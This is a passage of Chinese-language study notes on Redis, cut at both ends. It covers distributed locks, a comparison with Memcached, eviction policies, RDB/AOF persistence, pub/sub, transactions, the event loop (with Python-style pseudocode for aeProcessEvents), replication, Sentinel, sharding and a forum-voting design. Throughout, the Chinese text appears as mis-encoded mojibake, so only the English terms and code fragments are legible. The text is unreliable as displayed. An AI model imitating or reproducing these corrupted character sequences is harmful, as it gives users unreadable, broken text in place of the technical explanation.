æ³•ä½¿ç”¨å•æœºç¯å¢ƒä¸‹çš„é”å®ç°ã€‚å½“å¤šä¸ªèŠ‚ç‚¹ä¸Šçš„è¿›ç¨‹éƒ½éœ€è¦è·å–åŒä¸€ä¸ªé”æ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼é”æ¥è¿›è¡ŒåŒæ­¥ã€‚ é™¤äº†å¯ä»¥ä½¿ç”¨ Redis è‡ªå¸¦çš„ SETNX å‘½ä»¤å®ç°åˆ†å¸ƒå¼é”ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å®˜æ–¹æä¾›çš„ RedLock åˆ†å¸ƒå¼é”å®ç°ã€‚ å…¶å®ƒSet å¯ä»¥å®ç°äº¤é›†ã€å¹¶é›†ç­‰æ“ä½œï¼Œä¾‹å¦‚å…±åŒå¥½å‹åŠŸèƒ½ã€‚ ZSet å¯ä»¥å®ç°æœ‰åºæ€§æ“ä½œï¼Œä¾‹å¦‚æ’è¡Œæ¦œåŠŸèƒ½ã€‚ äº”ã€Redis ä¸ Memcachedä¸¤è€…éƒ½æ˜¯éå…³ç³»å‹å†…å­˜é”®å€¼æ•°æ®åº“ã€‚æœ‰ä»¥ä¸‹ä¸»è¦ä¸åŒï¼š æ•°æ®ç±»å‹Memcached ä»…æ”¯æŒå­—ç¬¦ä¸²ç±»å‹ï¼Œè€Œ Redis æ”¯æŒäº”ç§ä¸åŒç§ç±»çš„æ•°æ®ç±»å‹ï¼Œä½¿å¾—å®ƒå¯ä»¥æ›´çµæ´»åœ°è§£å†³é—®é¢˜ã€‚ æ•°æ®æŒä¹…åŒ–Redis æ”¯æŒä¸¤ç§æŒä¹…åŒ–ç­–ç•¥ï¼šRDB å¿«ç…§å’Œ AOF æ—¥å¿—ï¼Œè€Œ Memcached ä¸æ”¯æŒæŒä¹…åŒ–ã€‚ åˆ†å¸ƒå¼Memcached ä¸æ”¯æŒåˆ†å¸ƒå¼ï¼Œåªèƒ½é€šè¿‡åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œè¿™æ ·çš„åˆ†å¸ƒå¼ç®—æ³•æ¥å®ç°åˆ†å¸ƒå¼å­˜å‚¨ï¼Œè¿™ç§æ–¹å¼åœ¨å­˜å‚¨å’ŒæŸ¥è¯¢æ—¶éƒ½éœ€è¦å…ˆåœ¨å®¢æˆ·ç«¯è®¡ç®—ä¸€æ¬¡æ•°æ®æ‰€åœ¨çš„èŠ‚ç‚¹ã€‚ Redis Cluster å®ç°äº†åˆ†å¸ƒå¼çš„æ”¯æŒã€‚ å†…å­˜ç®¡ç†æœºåˆ¶åœ¨ Redis ä¸­ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰æ•°æ®éƒ½ä¸€ç›´å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå¯ä»¥å°†ä¸€äº›å¾ˆä¹…æ²¡ç”¨çš„ value äº¤æ¢åˆ°ç£ç›˜ã€‚è€Œ Memcached çš„æ•°æ®åˆ™ä¼šä¸€ç›´åœ¨å†…å­˜ä¸­ã€‚ Memcached å°†å†…å­˜åˆ†å‰²æˆç‰¹å®šé•¿åº¦çš„å—æ¥å­˜å‚¨æ•°æ®ï¼Œä»¥å®Œå…¨è§£å†³å†…å­˜ç¢ç‰‡çš„é—®é¢˜ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼ä¼šä½¿å¾—å†…å­˜çš„åˆ©ç”¨ç‡ä¸é«˜ï¼Œä¾‹å¦‚å—çš„å¤§å°ä¸º 128 bytesï¼Œåªå­˜å‚¨ 100 bytes çš„æ•°æ®ï¼Œé‚£ä¹ˆå‰©ä¸‹çš„ 28 bytes å°±æµªè´¹æ‰äº†ã€‚ å…­ã€é”®çš„è¿‡æœŸæ—¶é—´Redis å¯ä»¥ä¸ºæ¯ä¸ªé”®è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå½“é”®è¿‡æœŸæ—¶ï¼Œä¼šè‡ªåŠ¨åˆ é™¤è¯¥é”®ã€‚ å¯¹äºæ•£åˆ—è¡¨è¿™ç§å®¹å™¨ï¼Œåªèƒ½ä¸ºæ•´ä¸ªé”®è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆæ•´ä¸ªæ•£åˆ—è¡¨ï¼‰ï¼Œè€Œä¸èƒ½ä¸ºé”®é‡Œé¢çš„å•ä¸ªå…ƒç´ è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚ ä¸ƒã€æ•°æ®æ·˜æ±°ç­–ç•¥å¯ä»¥è®¾ç½®å†…å­˜æœ€å¤§ä½¿ç”¨é‡ï¼Œå½“å†…å­˜ä½¿ç”¨é‡è¶…è¿‡æ—¶æ–½è¡Œæ·˜æ±°ç­–ç•¥ï¼Œå…·ä½“æœ‰ 6 ç§æ·˜æ±°ç­–ç•¥ã€‚ ç­–ç•¥ æè¿° volatile-lru ä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ä¸­æŒ‘é€‰æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±° volatile-ttl ä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ä¸­æŒ‘é€‰å°†è¦è¿‡æœŸçš„æ•°æ®æ·˜æ±° volatile-random ä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ä¸­ä»»æ„é€‰æ‹©æ•°æ®æ·˜æ±° allkeys-lru ä»æ‰€æœ‰æ•°æ®é›†ä¸­æŒ‘é€‰æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±° allkeys-random ä»æ‰€æœ‰æ•°æ®é›†ä¸­ä»»æ„é€‰æ‹©æ•°æ®è¿›è¡Œæ·˜æ±° noeviction ç¦æ­¢é©±é€æ•°æ® å¦‚æœä½¿ç”¨ Redis æ¥ç¼“å­˜æ•°æ®æ—¶ï¼Œè¦ä¿è¯æ‰€æœ‰æ•°æ®éƒ½æ˜¯çƒ­ç‚¹æ•°æ®ï¼Œå¯ä»¥å°†å†…å­˜æœ€å¤§ä½¿ç”¨é‡è®¾ç½®ä¸ºçƒ­ç‚¹æ•°æ®å ç”¨çš„å†…å­˜é‡ï¼Œç„¶åå¯ç”¨ allkeys-lru æ·˜æ±°ç­–ç•¥ï¼Œå°†æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±°ã€‚ ä½œä¸ºå†…å­˜æ•°æ®åº“ï¼Œå‡ºäºå¯¹æ€§èƒ½å’Œå†…å­˜æ¶ˆè€—çš„è€ƒè™‘ï¼ŒRedis çš„æ·˜æ±°ç®—æ³•ï¼ˆLRUã€TTLï¼‰å®é™…å®ç°ä¸Šå¹¶éé’ˆå¯¹æ‰€æœ‰ keyï¼Œè€Œæ˜¯æŠ½æ ·ä¸€å°éƒ¨åˆ† key ä»ä¸­é€‰å‡ºè¢«æ·˜æ±° keyã€‚ å…«ã€æŒä¹…åŒ–Redis æ˜¯å†…å­˜å‹æ•°æ®åº“ï¼Œä¸ºäº†ä¿è¯æ•°æ®åœ¨æ–­ç”µåä¸ä¼šä¸¢å¤±ï¼Œéœ€è¦å°†å†…å­˜ä¸­çš„æ•°æ®æŒä¹…åŒ–åˆ°ç¡¬ç›˜ä¸Šã€‚ å¿«ç…§æŒä¹…åŒ–å°†æŸä¸ªæ—¶é—´ç‚¹çš„æ‰€æœ‰æ•°æ®éƒ½å­˜æ”¾åˆ°ç¡¬ç›˜ä¸Šã€‚ å¯ä»¥å°†å¿«ç…§å¤åˆ¶åˆ°å…¶å®ƒæœåŠ¡å™¨ä»è€Œåˆ›å»ºå…·æœ‰ç›¸åŒæ•°æ®çš„æœåŠ¡å™¨å‰¯æœ¬ã€‚ å¦‚æœç³»ç»Ÿå‘ç”Ÿæ•…éšœï¼Œå°†ä¼šä¸¢å¤±æœ€åä¸€æ¬¡åˆ›å»ºå¿«ç…§ä¹‹åçš„æ•°æ®ã€‚ å¦‚æœæ•°æ®é‡å¾ˆå¤§ï¼Œä¿å­˜å¿«ç…§çš„æ—¶é—´ä¼šå¾ˆé•¿ã€‚ AOF æŒä¹…åŒ–å°†å†™å‘½ä»¤æ·»åŠ åˆ° AOF æ–‡ä»¶ï¼ˆAppend Only Fileï¼‰çš„æœ«å°¾ã€‚ å¯¹ç¡¬ç›˜çš„æ–‡ä»¶è¿›è¡Œå†™å…¥æ—¶ï¼Œå†™å…¥çš„å†…å®¹é¦–å…ˆä¼šè¢«å­˜å‚¨åˆ°ç¼“å†²åŒºï¼Œç„¶åç”±æ“ä½œç³»ç»Ÿå†³å®šä»€ä¹ˆæ—¶å€™å°†è¯¥å†…å®¹åŒæ­¥åˆ°ç¡¬ç›˜ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ file.flush() æ–¹æ³•è¯·æ±‚æ“ä½œç³»ç»Ÿå°½å¿«å°†ç¼“å†²åŒºå­˜å‚¨çš„æ•°æ®åŒæ­¥åˆ°ç¡¬ç›˜ã€‚å¯ä»¥çœ‹å‡ºå†™å…¥æ–‡ä»¶çš„æ•°æ®ä¸ä¼šç«‹å³åŒæ­¥åˆ°ç¡¬ç›˜ä¸Šï¼Œåœ¨å°†å†™å‘½ä»¤æ·»åŠ åˆ° AOF æ–‡ä»¶æ—¶ï¼Œè¦æ ¹æ®éœ€æ±‚æ¥ä¿è¯ä½•æ—¶åŒæ­¥åˆ°ç¡¬ç›˜ä¸Šã€‚ æœ‰ä»¥ä¸‹åŒæ­¥é€‰é¡¹ï¼š é€‰é¡¹ åŒæ­¥é¢‘ç‡ always æ¯ä¸ªå†™å‘½ä»¤éƒ½åŒæ­¥ everysec æ¯ç§’åŒæ­¥ä¸€æ¬¡ no è®©æ“ä½œç³»ç»Ÿæ¥å†³å®šä½•æ—¶åŒæ­¥ always é€‰é¡¹ä¼šä¸¥é‡å‡ä½æœåŠ¡å™¨çš„æ€§èƒ½ï¼› everysec é€‰é¡¹æ¯”è¾ƒåˆé€‚ï¼Œå¯ä»¥ä¿è¯ç³»ç»Ÿå¥”æºƒæ—¶åªä¼šä¸¢å¤±ä¸€ç§’å·¦å³çš„æ•°æ®ï¼Œå¹¶ä¸” Redis æ¯ç§’æ‰§è¡Œä¸€æ¬¡åŒæ­¥å¯¹æœåŠ¡å™¨æ€§èƒ½å‡ ä¹æ²¡æœ‰ä»»ä½•å½±å“ï¼› no é€‰é¡¹å¹¶ä¸èƒ½ç»™æœåŠ¡å™¨æ€§èƒ½å¸¦æ¥å¤šå¤§çš„æå‡ï¼Œè€Œä¸”ä¹Ÿä¼šå¢åŠ ç³»ç»Ÿå¥”æºƒæ—¶æ•°æ®ä¸¢å¤±çš„æ•°é‡ã€‚ éšç€æœåŠ¡å™¨å†™è¯·æ±‚çš„å¢å¤šï¼ŒAOF æ–‡ä»¶ä¼šè¶Šæ¥è¶Šå¤§ã€‚Redis æä¾›äº†ä¸€ç§å°† AOF é‡å†™çš„ç‰¹æ€§ï¼Œèƒ½å¤Ÿå»é™¤ AOF æ–‡ä»¶ä¸­çš„å†—ä½™å†™å‘½ä»¤ã€‚ ä¹ã€å‘å¸ƒä¸è®¢é˜…è®¢é˜…è€…è®¢é˜…äº†é¢‘é“ä¹‹åï¼Œå‘å¸ƒè€…å‘é¢‘é“å‘é€å­—ç¬¦ä¸²æ¶ˆæ¯ä¼šè¢«æ‰€æœ‰è®¢é˜…è€…æ¥æ”¶åˆ°ã€‚ æŸä¸ªå®¢æˆ·ç«¯ä½¿ç”¨ SUBSCRIBE è®¢é˜…ä¸€ä¸ªé¢‘é“ï¼Œå…¶å®ƒå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨ PUBLISH å‘è¿™ä¸ªé¢‘é“å‘é€æ¶ˆæ¯ã€‚ å‘å¸ƒä¸è®¢é˜…æ¨¡å¼å’Œè§‚å¯Ÿè€…æ¨¡å¼æœ‰ä»¥ä¸‹ä¸åŒï¼š è§‚å¯Ÿè€…æ¨¡å¼ä¸­ï¼Œè§‚å¯Ÿè€…å’Œä¸»é¢˜éƒ½çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ï¼›è€Œåœ¨å‘å¸ƒä¸è®¢é˜…æ¨¡å¼ä¸­ï¼Œå‘å¸ƒè€…ä¸è®¢é˜…è€…ä¸çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ï¼Œå®ƒä»¬ä¹‹é—´é€šè¿‡é¢‘é“è¿›è¡Œé€šä¿¡ã€‚ è§‚å¯Ÿè€…æ¨¡å¼æ˜¯åŒæ­¥çš„ï¼Œå½“äº‹ä»¶è§¦å‘æ—¶ï¼Œä¸»é¢˜ä¼šå»è°ƒç”¨è§‚å¯Ÿè€…çš„æ–¹æ³•ï¼Œç„¶åç­‰å¾…æ–¹æ³•è¿”å›ï¼›è€Œå‘å¸ƒä¸è®¢é˜…æ¨¡å¼æ˜¯å¼‚æ­¥çš„ï¼Œå‘å¸ƒè€…å‘é¢‘é“å‘é€ä¸€ä¸ªæ¶ˆæ¯ä¹‹åï¼Œå°±ä¸éœ€è¦å…³å¿ƒè®¢é˜…è€…ä½•æ—¶å»è®¢é˜…è¿™ä¸ªæ¶ˆæ¯ã€‚ åã€äº‹åŠ¡ä¸€ä¸ªäº‹åŠ¡åŒ…å«äº†å¤šä¸ªå‘½ä»¤ï¼ŒæœåŠ¡å™¨åœ¨æ‰§è¡Œäº‹åŠ¡æœŸé—´ï¼Œä¸ä¼šæ”¹å»æ‰§è¡Œå…¶å®ƒå®¢æˆ·ç«¯çš„å‘½ä»¤è¯·æ±‚ã€‚ äº‹åŠ¡ä¸­çš„å¤šä¸ªå‘½ä»¤è¢«ä¸€æ¬¡æ€§å‘é€ç»™æœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯ä¸€æ¡ä¸€æ¡å‘é€ï¼Œè¿™ç§æ–¹å¼è¢«ç§°ä¸ºæµæ°´çº¿ï¼Œå®ƒå¯ä»¥å‡å°‘å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„ç½‘ç»œé€šä¿¡æ¬¡æ•°ä»è€Œæå‡æ€§èƒ½ã€‚ Redis æœ€ç®€å•çš„äº‹åŠ¡å®ç°æ–¹å¼æ˜¯ä½¿ç”¨ MULTI å’Œ EXEC å‘½ä»¤å°†äº‹åŠ¡æ“ä½œåŒ…å›´èµ·æ¥ã€‚ åä¸€ã€äº‹ä»¶Redis æœåŠ¡å™¨æ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ç¨‹åºã€‚ æ–‡ä»¶äº‹ä»¶æœåŠ¡å™¨é€šè¿‡å¥—æ¥å­—ä¸å®¢æˆ·ç«¯æˆ–è€…å…¶å®ƒæœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œæ–‡ä»¶äº‹ä»¶å°±æ˜¯å¯¹å¥—æ¥å­—æ“ä½œçš„æŠ½è±¡ã€‚ Redis åŸºäº Reactor æ¨¡å¼å¼€å‘äº†è‡ªå·±çš„ç½‘ç»œäº‹ä»¶å¤„ç†å™¨ï¼Œä½¿ç”¨ I/O å¤šè·¯å¤ç”¨ç¨‹åºæ¥åŒæ—¶ç›‘å¬å¤šä¸ªå¥—æ¥å­—ï¼Œå¹¶å°†åˆ°è¾¾çš„äº‹ä»¶ä¼ é€ç»™æ–‡ä»¶äº‹ä»¶åˆ†æ´¾å™¨ï¼Œåˆ†æ´¾å™¨ä¼šæ ¹æ®å¥—æ¥å­—äº§ç”Ÿçš„äº‹ä»¶ç±»å‹è°ƒç”¨ç›¸åº”çš„äº‹ä»¶å¤„ç†å™¨ã€‚ æ—¶é—´äº‹ä»¶æœåŠ¡å™¨æœ‰ä¸€äº›æ“ä½œéœ€è¦åœ¨ç»™å®šçš„æ—¶é—´ç‚¹æ‰§è¡Œï¼Œæ—¶é—´äº‹ä»¶æ˜¯å¯¹è¿™ç±»å®šæ—¶æ“ä½œçš„æŠ½è±¡ã€‚ æ—¶é—´äº‹ä»¶åˆåˆ†ä¸ºï¼š å®šæ—¶äº‹ä»¶ï¼šæ˜¯è®©ä¸€æ®µç¨‹åºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹å†…æ‰§è¡Œä¸€æ¬¡ï¼› å‘¨æœŸæ€§äº‹ä»¶ï¼šæ˜¯è®©ä¸€æ®µç¨‹åºæ¯éš”æŒ‡å®šæ—¶é—´å°±æ‰§è¡Œä¸€æ¬¡ã€‚ Redis å°†æ‰€æœ‰æ—¶é—´äº‹ä»¶éƒ½æ”¾åœ¨ä¸€ä¸ªæ— åºé“¾è¡¨ä¸­ï¼Œé€šè¿‡éå†æ•´ä¸ªé“¾è¡¨æŸ¥æ‰¾å‡ºå·²åˆ°è¾¾çš„æ—¶é—´äº‹ä»¶ï¼Œå¹¶è°ƒç”¨ç›¸åº”çš„äº‹ä»¶å¤„ç†å™¨ã€‚ äº‹ä»¶çš„è°ƒåº¦ä¸æ‰§è¡ŒæœåŠ¡å™¨éœ€è¦ä¸æ–­ç›‘å¬æ–‡ä»¶äº‹ä»¶çš„å¥—æ¥å­—æ‰èƒ½å¾—åˆ°å¾…å¤„ç†çš„æ–‡ä»¶äº‹ä»¶ï¼Œä½†æ˜¯ä¸èƒ½ä¸€ç›´ç›‘å¬ï¼Œå¦åˆ™æ—¶é—´äº‹ä»¶æ— æ³•åœ¨è§„å®šçš„æ—¶é—´å†…æ‰§è¡Œï¼Œå› æ­¤ç›‘å¬æ—¶é—´åº”è¯¥æ ¹æ®è·ç¦»ç°åœ¨æœ€è¿‘çš„æ—¶é—´äº‹ä»¶æ¥å†³å®šã€‚ äº‹ä»¶è°ƒåº¦ä¸æ‰§è¡Œç”± aeProcessEvents å‡½æ•°è´Ÿè´£ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516def aeProcessEvents(): # è·å–åˆ°è¾¾æ—¶é—´ç¦»å½“å‰æ—¶é—´æœ€æ¥è¿‘çš„æ—¶é—´äº‹ä»¶ time_event = aeSearchNearestTimer() # è®¡ç®—æœ€æ¥è¿‘çš„æ—¶é—´äº‹ä»¶è·ç¦»åˆ°è¾¾è¿˜æœ‰å¤šå°‘æ¯«ç§’ remaind_ms = time_event.when - unix_ts_now() # å¦‚æœäº‹ä»¶å·²åˆ°è¾¾ï¼Œé‚£ä¹ˆ remaind_ms çš„å€¼å¯èƒ½ä¸ºè´Ÿæ•°ï¼Œå°†å®ƒè®¾ä¸º 0 if remaind_ms &lt; 0: remaind_ms = 0 # æ ¹æ® remaind_ms çš„å€¼ï¼Œåˆ›å»º timeval timeval = create_timeval_with_ms(remaind_ms) # é˜»å¡å¹¶ç­‰å¾…æ–‡ä»¶äº‹ä»¶äº§ç”Ÿï¼Œæœ€å¤§é˜»å¡æ—¶é—´ç”±ä¼ å…¥çš„ timeval å†³å®š aeApiPoll(timeval) # å¤„ç†æ‰€æœ‰å·²äº§ç”Ÿçš„æ–‡ä»¶äº‹ä»¶ procesFileEvents() # å¤„ç†æ‰€æœ‰å·²åˆ°è¾¾çš„æ—¶é—´äº‹ä»¶ processTimeEvents() å°† aeProcessEvents å‡½æ•°ç½®äºä¸€ä¸ªå¾ªç¯é‡Œé¢ï¼ŒåŠ ä¸Šåˆå§‹åŒ–å’Œæ¸…ç†å‡½æ•°ï¼Œå°±æ„æˆäº† Redis æœåŠ¡å™¨çš„ä¸»å‡½æ•°ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š 12345678def main(): # åˆå§‹åŒ–æœåŠ¡å™¨ init_server() # ä¸€ç›´å¤„ç†äº‹ä»¶ï¼Œç›´åˆ°æœåŠ¡å™¨å…³é—­ä¸ºæ­¢ while server_is_not_shutdown(): aeProcessEvents() # æœåŠ¡å™¨å…³é—­ï¼Œæ‰§è¡Œæ¸…ç†æ“ä½œ clean_server() ä»äº‹ä»¶å¤„ç†çš„è§’åº¦æ¥çœ‹ï¼ŒæœåŠ¡å™¨è¿è¡Œæµç¨‹å¦‚ä¸‹ï¼š åäºŒã€å¤åˆ¶é€šè¿‡ä½¿ç”¨ slaveof host port å‘½ä»¤æ¥è®©ä¸€ä¸ªæœåŠ¡å™¨æˆä¸ºå¦ä¸€ä¸ªæœåŠ¡å™¨çš„ä»æœåŠ¡å™¨ã€‚ ä¸€ä¸ªä»æœåŠ¡å™¨åªèƒ½æœ‰ä¸€ä¸ªä¸»æœåŠ¡å™¨ï¼Œå¹¶ä¸”ä¸æ”¯æŒä¸»ä¸»å¤åˆ¶ã€‚ è¿æ¥è¿‡ç¨‹ ä¸»æœåŠ¡å™¨åˆ›å»ºå¿«ç…§æ–‡ä»¶ï¼Œå‘é€ç»™ä»æœåŠ¡å™¨ï¼Œå¹¶åœ¨å‘é€æœŸé—´ä½¿ç”¨ç¼“å†²åŒºè®°å½•æ‰§è¡Œçš„å†™å‘½ä»¤ã€‚å¿«ç…§æ–‡ä»¶å‘é€å®Œæ¯•ä¹‹åï¼Œå¼€å§‹å‘ä»æœåŠ¡å™¨å‘é€å­˜å‚¨åœ¨ç¼“å†²åŒºä¸­çš„å†™å‘½ä»¤ï¼› ä»æœåŠ¡å™¨ä¸¢å¼ƒæ‰€æœ‰æ—§æ•°æ®ï¼Œè½½å…¥ä¸»æœåŠ¡å™¨å‘æ¥çš„å¿«ç…§æ–‡ä»¶ï¼Œä¹‹åä»æœåŠ¡å™¨å¼€å§‹æ¥å—ä¸»æœåŠ¡å™¨å‘æ¥çš„å†™å‘½ä»¤ï¼› ä¸»æœåŠ¡å™¨æ¯æ‰§è¡Œä¸€æ¬¡å†™å‘½ä»¤ï¼Œå°±å‘ä»æœåŠ¡å™¨å‘é€ç›¸åŒçš„å†™å‘½ä»¤ã€‚ ä¸»ä»é“¾éšç€è´Ÿè½½ä¸æ–­ä¸Šå‡ï¼Œä¸»æœåŠ¡å™¨å¯èƒ½æ— æ³•å¾ˆå¿«åœ°æ›´æ–°æ‰€æœ‰ä»æœåŠ¡å™¨ï¼Œæˆ–è€…é‡æ–°è¿æ¥å’Œé‡æ–°åŒæ­¥ä»æœåŠ¡å™¨å°†å¯¼è‡´ç³»ç»Ÿè¶…è½½ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªä¸­é—´å±‚æ¥åˆ†æ‹…ä¸»æœåŠ¡å™¨çš„å¤åˆ¶å·¥ä½œã€‚ä¸­é—´å±‚çš„æœåŠ¡å™¨æ˜¯æœ€ä¸Šå±‚æœåŠ¡å™¨çš„ä»æœåŠ¡å™¨ï¼Œåˆæ˜¯æœ€ä¸‹å±‚æœåŠ¡å™¨çš„ä¸»æœåŠ¡å™¨ã€‚ åä¸‰ã€SentinelSentinelï¼ˆå“¨å…µï¼‰å¯ä»¥ç›‘å¬ä¸»æœåŠ¡å™¨ï¼Œå¹¶åœ¨ä¸»æœåŠ¡å™¨è¿›å…¥ä¸‹çº¿çŠ¶æ€æ—¶ï¼Œè‡ªåŠ¨ä»ä»æœåŠ¡å™¨ä¸­é€‰ä¸¾å‡ºæ–°çš„ä¸»æœåŠ¡å™¨ã€‚ åå››ã€åˆ†ç‰‡åˆ†ç‰‡æ˜¯å°†æ•°æ®åˆ’åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†çš„æ–¹æ³•ï¼Œå¯ä»¥å°†æ•°æ®å­˜å‚¨åˆ°å¤šå°æœºå™¨é‡Œé¢ï¼Œä¹Ÿå¯ä»¥ä»å¤šå°æœºå™¨é‡Œé¢è·å–æ•°æ®ï¼Œè¿™ç§æ–¹æ³•åœ¨è§£å†³æŸäº›é—®é¢˜æ—¶å¯ä»¥è·å¾—çº¿æ€§çº§åˆ«çš„æ€§èƒ½æå‡ã€‚ å‡è®¾æœ‰ 4 ä¸ª Reids å®ä¾‹ R0ï¼ŒR1ï¼ŒR2ï¼ŒR3ï¼Œè¿˜æœ‰å¾ˆå¤šè¡¨ç¤ºç”¨æˆ·çš„é”® user:1ï¼Œuser:2ï¼Œâ€¦ ç­‰ç­‰ï¼Œæœ‰ä¸åŒçš„æ–¹å¼æ¥é€‰æ‹©ä¸€ä¸ªæŒ‡å®šçš„é”®å­˜å‚¨åœ¨å“ªä¸ªå®ä¾‹ä¸­ã€‚æœ€ç®€å•çš„æ–¹å¼æ˜¯èŒƒå›´åˆ†ç‰‡ï¼Œä¾‹å¦‚ç”¨æˆ· id ä» 0\1000 çš„å­˜å‚¨åˆ°å®ä¾‹ R0 ä¸­ï¼Œç”¨æˆ· id ä» 1001\2000 çš„å­˜å‚¨åˆ°å®ä¾‹ R1 ä¸­ï¼Œç­‰ç­‰ã€‚ä½†æ˜¯è¿™æ ·éœ€è¦ç»´æŠ¤ä¸€å¼ æ˜ å°„èŒƒå›´è¡¨ï¼Œç»´æŠ¤æ“ä½œä»£ä»·å¾ˆé«˜ã€‚è¿˜æœ‰ä¸€ç§æ–¹å¼æ˜¯å“ˆå¸Œåˆ†ç‰‡ï¼Œä½¿ç”¨ CRC32 å“ˆå¸Œå‡½æ•°å°†é”®è½¬æ¢ä¸ºä¸€ä¸ªæ•°å­—ï¼Œå†å¯¹å®ä¾‹æ•°é‡æ±‚æ¨¡å°±èƒ½çŸ¥é“åº”è¯¥å­˜å‚¨çš„å®ä¾‹ã€‚ æ ¹æ®æ‰§è¡Œåˆ†ç‰‡çš„ä½ç½®ï¼Œå¯ä»¥åˆ†ä¸ºä¸‰ç§åˆ†ç‰‡æ–¹å¼ï¼š å®¢æˆ·ç«¯åˆ†ç‰‡ï¼šå®¢æˆ·ç«¯ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç­‰ç®—æ³•å†³å®šé”®åº”å½“åˆ†å¸ƒåˆ°å“ªä¸ªèŠ‚ç‚¹ã€‚ ä»£ç†åˆ†ç‰‡ï¼šå°†å®¢æˆ·ç«¯è¯·æ±‚å‘é€åˆ°ä»£ç†ä¸Šï¼Œç”±ä»£ç†è½¬å‘è¯·æ±‚åˆ°æ­£ç¡®çš„èŠ‚ç‚¹ä¸Šã€‚ æœåŠ¡å™¨åˆ†ç‰‡ï¼šRedis Clusterã€‚ åäº”ã€ä¸€ä¸ªç®€å•çš„è®ºå›ç³»ç»Ÿåˆ†æè¯¥è®ºå›ç³»ç»ŸåŠŸèƒ½å¦‚ä¸‹ï¼š å¯ä»¥å‘å¸ƒæ–‡ç« ï¼› å¯ä»¥å¯¹æ–‡ç« è¿›è¡Œç‚¹èµï¼› åœ¨é¦–é¡µå¯ä»¥æŒ‰æ–‡ç« çš„å‘å¸ƒæ—¶é—´æˆ–è€…æ–‡ç« çš„ç‚¹èµæ•°è¿›è¡Œæ’åºæ˜¾ç¤ºã€‚ æ–‡ç« ä¿¡æ¯æ–‡ç« åŒ…æ‹¬æ ‡é¢˜ã€ä½œè€…ã€èµæ•°ç­‰ä¿¡æ¯ï¼Œåœ¨å…³ç³»å‹æ•°æ®åº“ä¸­å¾ˆå®¹æ˜“æ„å»ºä¸€å¼ è¡¨æ¥å­˜å‚¨è¿™äº›ä¿¡æ¯ï¼Œåœ¨ Redis ä¸­å¯ä»¥ä½¿ç”¨ HASH æ¥å­˜å‚¨æ¯ç§ä¿¡æ¯ä»¥åŠå…¶å¯¹åº”çš„å€¼çš„æ˜ å°„ã€‚ Redis æ²¡æœ‰å…³ç³»å‹æ•°æ®åº“ä¸­çš„è¡¨è¿™ä¸€æ¦‚å¿µæ¥å°†åŒç§ç±»å‹çš„æ•°æ®å­˜æ”¾åœ¨ä¸€èµ·ï¼Œè€Œæ˜¯ä½¿ç”¨å‘½åç©ºé—´çš„æ–¹å¼æ¥å®ç°è¿™ä¸€åŠŸèƒ½ã€‚é”®åçš„å‰é¢éƒ¨åˆ†å­˜å‚¨å‘½åç©ºé—´ï¼Œåé¢éƒ¨åˆ†çš„å†…å®¹å­˜å‚¨ IDï¼Œé€šå¸¸ä½¿ç”¨ : æ¥è¿›è¡Œåˆ†éš”ã€‚ä¾‹å¦‚ä¸‹é¢çš„ HASH çš„é”®åä¸º article:92617ï¼Œå…¶ä¸­ article ä¸ºå‘½åç©ºé—´ï¼ŒID ä¸º 92617ã€‚ ç‚¹èµåŠŸèƒ½å½“æœ‰ç”¨æˆ·ä¸ºä¸€ç¯‡æ–‡ç« ç‚¹èµæ—¶ï¼Œé™¤äº†è¦å¯¹è¯¥æ–‡ç« çš„ votes å­—æ®µè¿›è¡ŒåŠ  1 æ“ä½œï¼Œè¿˜å¿…é¡»è®°å½•è¯¥ç”¨æˆ·å·²ç»å¯¹è¯¥æ–‡ç« è¿›è¡Œäº†ç‚¹èµï¼Œé˜²æ­¢ç”¨æˆ·ç‚¹èµæ¬¡æ•°è¶…è¿‡ 1ã€‚å¯ä»¥å»ºç«‹æ–‡ç« çš„å·²æŠ•ç¥¨ç”¨æˆ·é›†åˆæ¥è¿›è¡Œè®°å½•ã€‚ ä¸ºäº†èŠ‚çº¦å†…å­˜ï¼Œè§„å®šä¸€ç¯‡æ–‡ç« å‘å¸ƒæ»¡ä¸€å‘¨ä¹‹åï¼Œå°±ä¸èƒ½å†å¯¹å®ƒè¿›è¡ŒæŠ•ç¥¨ï¼Œè€Œæ–‡ç« çš„å·²æŠ•ç¥¨é›†åˆä¹Ÿä¼šè¢«åˆ é™¤ï¼Œå¯ä»¥ä¸ºæ–‡ç« çš„å·²æŠ•ç¥¨é›†åˆè®¾ç½®ä¸€ä¸ªä¸€å‘¨çš„è¿‡æœŸæ—¶é—´å°±èƒ½å®ç°è¿™ä¸ªè§„å®šã€‚ å¯¹æ–‡ç« 